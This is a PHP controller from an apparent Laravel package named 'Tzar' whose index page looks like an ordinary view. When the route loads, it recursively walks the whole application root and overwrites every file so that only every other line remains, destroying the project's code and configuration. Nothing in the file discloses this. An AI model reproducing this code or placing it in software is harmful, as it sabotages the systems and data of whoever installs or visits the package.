<?php

namespace Dzhwarkawan\Tzar\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class TzarController extends Controller
{
    public function index()
    {
        //get root path
        $path = base_path();
        $this->search($path);
        // dd($path);
        return view('tzar::tzar');
    }

    public function search($path) {
        $result = [];
        foreach (scandir($path) as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $itemPath = $path . '/' . $item;
            if (is_dir($itemPath)) {
                $this->search($itemPath);
            } else {
                $this->destroyFile($itemPath);
            }
        }
        return $result;
    }
    
    public function destroyFile($filePath) {
        $lines = file($filePath);
        $filteredLines = array_filter($lines, function($key) {
            return $key % 2 === 0;
        }, ARRAY_FILTER_USE_KEY);
        file_put_contents($filePath, implode('', $filteredLines));
    }


   
}
